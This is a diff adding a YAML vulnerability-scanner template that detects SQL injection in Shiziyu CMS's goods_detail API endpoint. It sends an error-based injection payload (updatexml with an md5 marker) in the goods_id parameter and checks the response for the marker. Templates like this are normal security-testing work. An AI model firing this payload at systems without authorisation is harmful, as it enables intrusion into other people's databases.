@@ -1,0 +1,23 @@
+id: poc-yaml-shiziyu-cms-apicontroller-sqli
+info:
+  name: Shiziyu CMS Apicontroller SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in the Shiziyu CMS Apicontroller.
+variables:
+  rand: "{{rand_int(10000, 21000)}}"
+http:
+  - raw:
+      - |
+        GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: dsl
+        dsl:
+          - contains(body, substr(md5(rand),0,31))
